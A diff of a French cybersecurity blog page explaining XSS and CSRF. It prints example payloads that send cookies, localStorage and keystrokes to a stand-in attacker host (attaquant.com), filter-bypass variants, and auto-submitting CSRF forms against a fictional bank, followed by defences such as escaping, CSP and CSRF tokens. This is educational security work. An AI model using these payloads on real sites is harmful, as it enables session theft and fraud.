@@ -4,6 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- ===== GOOGLE ANALYTICS ===== -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CRVR89FWBH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-CRVR89FWBH');
+</script>
+
 <!-- ===== SEO ===== -->
 <title>XSS et CSRF : les attaques web les plus courantes — Temgus.CyberBlog</title>
 <meta name="description" content="Cross-Site Scripting et Cross-Site Request Forgery : fonctionnement et protections.">
@@ -12,7 +21,7 @@
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://temgus2025.github.io/temgus-cyberblog/pages/xss-csrf-attaques.html">
 
-<!-- ===== OPEN GRAPH (Facebook, LinkedIn) ===== -->
+<!-- ===== OPEN GRAPH ===== -->
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://temgus2025.github.io/temgus-cyberblog/pages/xss-csrf-attaques.html">
 <meta property="og:title" content="XSS et CSRF : les attaques web les plus courantes — Temgus.CyberBlog">
@@ -28,7 +37,6 @@
 
 <!-- ===== TWITTER CARD ===== -->
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:site" content="@temgus">
 <meta name="twitter:title" content="XSS et CSRF : les attaques web les plus courantes — Temgus.CyberBlog">
 <meta name="twitter:description" content="Cross-Site Scripting et Cross-Site Request Forgery : fonctionnement et protections.">
 <meta name="twitter:image" content="https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png">
@@ -41,22 +49,430 @@
   "headline": "XSS et CSRF : les attaques web les plus courantes",
   "description": "Cross-Site Scripting et Cross-Site Request Forgery : fonctionnement et protections.",
   "datePublished": "2025-05-19",
-  "author": {"@type": "Person", "name": "Temgus", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
-  "publisher": {"@type": "Person", "name": "Temgus"},
+  "author": {"@type": "Person", "name": "Derrick Temgoua", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
+  "publisher": {"@type": "Person", "name": "Derrick Temgoua"},
   "url": "https://temgus2025.github.io/temgus-cyberblog/pages/xss-csrf-attaques.html",
   "inLanguage": "fr",
   "keywords": "XSS, CSRF, web, OWASP",
-  "timeRequired": "PT8M"
+  "timeRequired": "PT8M",
+  "image": "https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png"
 }
 </script>
 
+<!-- ===== STYLES ===== -->
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/article.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+<style>
+  /* Styles spécifiques aux pages statiques */
+  .static-article-layout {
+    max-width: 860px;
+    margin: 100px auto 60px;
+    padding: 0 24px;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    color: #c9d1d9;
+    line-height: 1.8;
+  }
+  .static-article-layout h1 {
+    color: #00d4ff;
+    font-size: 2rem;
+    margin-bottom: 12px;
+  }
+  .static-article-layout h2 {
+    color: #00d4ff;
+    font-size: 1.4rem;
+    margin-top: 40px;
+    border-left: 3px solid #00d4ff;
+    padding-left: 12px;
+  }
+  .static-article-layout h3 {
+    color: #7ee787;
+    font-size: 1.1rem;
+    margin-top: 24px;
+  }
+  .static-article-layout p { margin: 12px 0; }
+  .static-article-layout ul, .static-article-layout ol {
+    padding-left: 24px;
+    margin: 12px 0;
+  }
+  .static-article-layout li { margin: 6px 0; }
+  .static-article-layout pre {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 20px 0;
+  }
+  .static-article-layout code {
+    background: #161b22;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    color: #e6edf3;
+  }
+  .static-article-layout pre code {
+    background: none;
+    padding: 0;
+  }
+  .static-article-layout strong { color: #e6edf3; }
+  .static-article-layout a { color: #00d4ff; }
+
+  .article-meta-banner {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin-bottom: 32px;
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .article-meta-banner .icon { font-size: 40px; }
+  .meta-info { flex: 1; }
+  .meta-category {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+  .meta-details {
+    color: #8892a4;
+    font-size: 13px;
+    margin-top: 8px;
+  }
+  .meta-details span { margin-right: 16px; }
+
+  .article-nav-links {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid #21262d;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  .article-nav-links a {
+    color: #00d4ff;
+    text-decoration: none;
+    font-size: 14px;
+    max-width: 45%;
+  }
+  .article-nav-links a:hover { text-decoration: underline; }
+
+  .toc-box {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 32px;
+  }
+  .toc-box h4 {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    margin: 0 0 12px;
+  }
+  .toc-list { list-style: none; padding: 0; margin: 0; }
+  .toc-list li { margin: 6px 0; }
+  .toc-list a { color: #8892a4; font-size: 14px; text-decoration: none; }
+  .toc-list a:hover { color: #00d4ff; }
+
+  .btn-read-original {
+    display: inline-block;
+    margin-top: 32px;
+    background: transparent;
+    border: 1px solid #00d4ff;
+    color: #00d4ff;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-size: 14px;
+    transition: all 0.2s;
+  }
+  .btn-read-original:hover {
+    background: #00d4ff;
+    color: #060d1a;
+  }
+</style>
 </head>
-<body style="background:#060d1a;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:20px;text-align:center;padding:40px">
-  <div style="font-size:48px">🕷️</div>
-  <h1 style="color:#00d4ff;font-size:22px;max-width:600px">XSS et CSRF : les attaques web les plus courantes</h1>
-  <p style="color:#8892a4;max-width:500px">Cross-Site Scripting et Cross-Site Request Forgery : fonctionnement et protections.</p>
-  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#xss-csrf-attaques" style="background:#00d4ff;color:#060d1a;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700">
-    Lire l'article →
+<body style="background:#060d1a">
+
+<canvas id="binary-canvas"></canvas>
+
+<!-- NAVBAR -->
+<nav id="navbar">
+  <a href="../index.html" class="logo">Temgus.<span>CyberBlog</span></a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Accueil</a></li>
+    <li><a href="../index.html#articles" class="active">Articles</a></li>
+    <li><a href="../index.html#categories">Catégories</a></li>
+    <li><a href="../a-propos.html">À propos</a></li>
+  </ul>
+  <a href="../index.html" class="btn-outline" style="font-size:13px;padding:7px 16px">← Retour</a>
+</nav>
+
+<!-- ARTICLE COMPLET -->
+<main class="static-article-layout">
+
+  <!-- Bannière méta -->
+  <div class="article-meta-banner">
+    <div class="icon">🕷️</div>
+    <div class="meta-info">
+      <div class="meta-category">Pentest</div>
+      <div style="color:#e6edf3;font-size:18px;font-weight:600">XSS et CSRF : les attaques web les plus courantes</div>
+      <div class="meta-details">
+        <span>📅 2025-05-19</span>
+        <span>⏱ 8 min de lecture</span>
+        <span>🏷 Intermédiaire</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Table des matières -->
+  <div class="toc-box"><h4>// SOMMAIRE</h4><ul class="toc-list"><li><a href="#xss-cross-site-scripting">XSS — Cross-Site Scripting</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#types-de-xss">Types de XSS</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#payloads-xss-courants">Payloads XSS courants</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#protection-contre-xss">Protection contre XSS</a></li>
+<li><a href="#csrf-cross-site-request-forgery">CSRF — Cross-Site Request Forgery</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#comment-a-fonctionne">Comment ça fonctionne</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#protection-contre-csrf">Protection contre CSRF</a></li>
+<li><a href="#conclusion">Conclusion</a></li></ul></div>
+
+  <!-- Contenu de l'article -->
+  <article><h1>XSS et CSRF : les attaques web les plus courantes</h1>
+
+<p>Le Cross-Site Scripting (XSS) et le Cross-Site Request Forgery (CSRF) figurent systématiquement dans l'OWASP Top 10. Ensemble, ils représentent des dizaines de milliers de vulnérabilités dans des applications web réelles.</p>
+
+<h2 id="xss-cross-site-scripting">XSS — Cross-Site Scripting</h2>
+
+<h3 id="types-de-xss">Types de XSS</h3>
+
+<p><strong>XSS Réfléchi (Reflected) :</strong></p>
+<pre><code class="language-html">&lt;!-- URL malveillante envoyée à la victime --&gt;
+<p>https://site.com/search?q=&lt;script&gt;document.location='http://attaquant.com/steal?c='+document.cookie&lt;/script&gt;</p>
+
+<p>&lt;!-- Le serveur vulnérable inclut directement l'input dans la page --&gt;</p>
+<p>&lt;p&gt;Résultats pour : &lt;script&gt;document.location='...'&lt;/script&gt;&lt;/p&gt;</code></pre>
+
+<p><strong>XSS Stocké (Stored) :</strong></p>
+<pre><code class="language-html">&lt;!-- Commentaire posté sur un forum vulnérable --&gt;
+<p>Votre commentaire : &lt;script&gt;</p>
+<p>// Ce script s'exécute pour CHAQUE visiteur qui voit le commentaire !</p>
+<p>fetch('https://attaquant.com/steal', {</p>
+<p>method: 'POST',</p>
+<p>body: JSON.stringify({</p>
+<p>cookie: document.cookie,</p>
+<p>url: window.location.href,</p>
+<p>localStorage: JSON.stringify(localStorage)</p>
+<p>})</p>
+<p>});</p>
+<p>&lt;/script&gt;</code></pre>
+
+<p><strong>XSS DOM-based :</strong></p>
+<pre><code class="language-javascript">// Code JavaScript vulnérable
+<p>var userInput = location.hash.substring(1);</p>
+<p>document.getElementById('output').innerHTML = userInput;</p>
+<p>// Si #&lt;img src=x onerror=alert(1)&gt; → XSS !</code></pre>
+
+<h3 id="payloads-xss-courants">Payloads XSS courants</h3>
+
+<pre><code class="language-javascript">// Test basique
+<p>&lt;script&gt;alert('XSS')&lt;/script&gt;</p>
+<p>&lt;img src=x onerror=alert('XSS')&gt;</p>
+<p>&lt;svg onload=alert('XSS')&gt;</p>
+
+<p>// Contournement de filtres</p>
+<p>&lt;sCriPt&gt;alert('XSS')&lt;/sCriPt&gt;              // Bypass casse</p>
+<p>&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;  // Encodage</p>
+<p>javascript:alert('XSS')                    // Dans href</p>
+<p>" onmouseover="alert('XSS')               // Dans attribut</p>
+
+<p>// Vol de cookies</p>
+<p>&lt;script&gt;new Image().src='http://attaquant.com/?c='+document.cookie&lt;/script&gt;</p>
+
+<p>// Keylogger</p>
+<p>&lt;script&gt;</p>
+<p>document.addEventListener('keypress', function(e) {</p>
+<p>fetch('http://attaquant.com/log?k=' + e.key);</p>
+<p>});</p>
+<p>&lt;/script&gt;</p>
+
+<p>// Defacement</p>
+<p>&lt;script&gt;document.body.innerHTML='&lt;h1&gt;Hacked&lt;/h1&gt;'&lt;/script&gt;</code></pre>
+
+<h3 id="protection-contre-xss">Protection contre XSS</h3>
+
+<pre><code class="language-python"># Python/Flask - Échappement automatique avec Jinja2
+<p>from flask import render_template</p>
+<p>from markupsafe import escape</p>
+
+<h1>✅ Jinja2 échappe automatiquement</h1>
+<p>return render_template('page.html', user_input=user_input)</p>
+<h1>Dans le template : {{ user_input }} → automatiquement échappé</h1>
+
+<h1>✅ Sanitisation avec bleach</h1>
+<p>import bleach</p>
+<p>ALLOWED_TAGS = ['b', 'i', 'u', 'em', 'strong']</p>
+<p>safe_html = bleach.clean(user_html, tags=ALLOWED_TAGS, strip=True)</code></pre>
+
+<pre><code class="language-javascript">// JavaScript - Éviter innerHTML, utiliser textContent
+<p>// ❌ Vulnérable</p>
+<p>element.innerHTML = userInput;</p>
+
+<p>// ✅ Sécurisé</p>
+<p>element.textContent = userInput;</p>
+
+<p>// Content Security Policy (CSP) - La protection la plus efficace</p>
+<p>// Header HTTP :</p>
+<p>Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'; img-src 'self' data:</p>
+
+<p>// Avec nonce dans le HTML :</p>
+<p>&lt;script nonce="random123"&gt;/<em> Code légitime </em>/&lt;/script&gt;</p>
+<p>// Les scripts sans nonce correct sont bloqués même si injectés par XSS</code></pre>
+
+<h2 id="csrf-cross-site-request-forgery">CSRF — Cross-Site Request Forgery</h2>
+
+<h3 id="comment-a-fonctionne">Comment ça fonctionne</h3>
+
+<pre><code class="language-html">&lt;!-- Scénario : utilisateur connecté à sa banque (banque.fr) --&gt;
+<p>&lt;!-- Visite un site malveillant qui contient : --&gt;</p>
+
+<p>&lt;!-- CSRF via image invisible --&gt;</p>
+<p>&lt;img src="https://banque.fr/virement?montant=1000&amp;vers=attaquant" width="0" height="0"&gt;</p>
+
+<p>&lt;!-- CSRF via formulaire auto-soumis --&gt;</p>
+<p>&lt;form id="csrf" action="https://banque.fr/virement" method="POST"&gt;</p>
+<p>&lt;input type="hidden" name="montant" value="1000"&gt;</p>
+<p>&lt;input type="hidden" name="vers" value="attaquant"&gt;</p>
+<p>&lt;/form&gt;</p>
+<p>&lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;</p>
+
+<p>&lt;!-- Le navigateur envoie automatiquement les cookies de session banque.fr</p>
+<p>→ La banque croit que c'est l'utilisateur qui fait le virement ! --&gt;</code></pre>
+
+<h3 id="protection-contre-csrf">Protection contre CSRF</h3>
+
+<pre><code class="language-python"># Token CSRF - La protection standard
+<p>from flask_wtf.csrf import CSRFProtect</p>
+<p>from secrets import token_hex</p>
+
+<h1>Génération du token</h1>
+<p>def generate_csrf_token():</p>
+<p>if 'csrf_token' not in session:</p>
+<p>session['csrf_token'] = token_hex(32)</p>
+<p>return session['csrf_token']</p>
+
+<h1>Vérification</h1>
+<p>def validate_csrf_token(token):</p>
+<p>return token == session.get('csrf_token')</p>
+
+<h1>Dans le formulaire HTML</h1>
+<h1>&lt;input type="hidden" name="csrf_token" value="{{ csrf_token() }}"&gt;</code></pre></h1>
+
+<pre><code class="language-javascript">// SameSite Cookie Attribute - Protection moderne
+<p>// Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly</p>
+
+<p>// SameSite=Strict : cookie jamais envoyé dans les requêtes cross-site</p>
+<p>// SameSite=Lax    : cookie envoyé seulement pour navigation top-level (GET)</p>
+<p>// SameSite=None   : ancien comportement (requiert Secure)</p>
+
+<p>// Double Submit Cookie Pattern</p>
+<p>const csrfToken = generateRandomToken();</p>
+<p>document.cookie = <code>csrf=${csrfToken}; SameSite=Strict</code>;</p>
+
+<p>fetch('/api/action', {</p>
+<p>method: 'POST',</p>
+<p>headers: {</p>
+<p>'X-CSRF-Token': csrfToken  // Doit matcher le cookie</p>
+<p>}</p>
+<p>});</code></pre>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>XSS et CSRF sont évitables à 100% avec les bonnes pratiques : <strong>échappement systématique des sorties, CSP stricte pour XSS, tokens CSRF + SameSite cookies pour CSRF</strong>. Ces protections doivent être activées par défaut dans tout nouveau projet.</p></article>
+
+  <!-- Lien vers la version interactive -->
+  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#xss-csrf-attaques" class="btn-read-original">
+    💬 Voir l'article avec commentaires →
   </a>
+
+  <!-- Navigation précédent / suivant -->
+  <div class="article-nav-links">
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/devsecops.html" class="nav-prev">← DevSecOps : intégrer la sécurité dans le développement</a>
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/https-ssl-tls.html" class="nav-next">HTTPS et certificats SSL/TLS : tout comprendre →</a>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-logo">Temgus.<span>CyberBlog</span></div>
+      <div class="footer-copy">© 2025 Temgus — Tous droits réservés</div>
+    </div>
+    <div class="footer-links">
+      <a href="../mentions-legales.html">Mentions légales</a>
+      <a href="../a-propos.html">Contact</a>
+      <a href="https://github.com/temgus2025" target="_blank">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+<!-- Coloration syntaxique -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  // Highlight.js
+  document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('pre code').forEach(el => hljs.highlightElement(el));
+  });
+
+  // Animation binaire (depuis style.css / app.js existant)
+  const canvas = document.getElementById('binary-canvas');
+  if (canvas) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 14);
+    const drops = Array(cols).fill(1);
+    function drawBinary() {
+      ctx.fillStyle = 'rgba(6,13,26,0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'rgba(0,212,255,0.15)';
+      ctx.font = '12px monospace';
+      drops.forEach((y, i) => {
+        ctx.fillText(Math.random() > 0.5 ? '1' : '0', i * 14, y * 14);
+        if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      });
+    }
+    setInterval(drawBinary, 50);
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  }
+
+  // Navbar scroll
+  window.addEventListener('scroll', () => {
+    const nav = document.getElementById('navbar');
+    if (nav) nav.classList.toggle('scrolled', window.scrollY > 50);
+  });
+
+  // Smooth scroll pour le sommaire
+  document.querySelectorAll('.toc-list a').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      const target = document.querySelector(a.getAttribute('href'));
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
 </body>
 </html>
